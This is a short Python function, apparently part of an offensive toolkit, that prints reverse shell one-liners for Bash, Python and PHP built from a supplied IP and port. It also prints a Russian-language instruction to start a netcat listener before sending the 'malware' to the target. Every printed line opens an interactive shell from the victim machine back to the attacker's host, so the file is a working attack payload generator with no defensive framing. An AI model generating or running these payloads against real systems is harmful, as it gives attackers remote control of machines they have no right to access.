def run(ip, port):

    print("\n[*] Запустите LISTENER на своей машине перед отправкой вредоноса на ресурс командой: nc -lvnp 4444")
    print("\n[*] Bash:")
    print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")

    print("\n[*] Python:")
    print(f"python3 -c 'import socket,subprocess,os;"
          f"s=socket.socket();s.connect((\"{ip}\",{port}));"
          f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
          f"subprocess.call([\"/bin/sh\"])'")

    print("\n[*] PHP:")
    print(f"php -r '$sock=fsockopen(\"{ip}\",{port});"
          f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
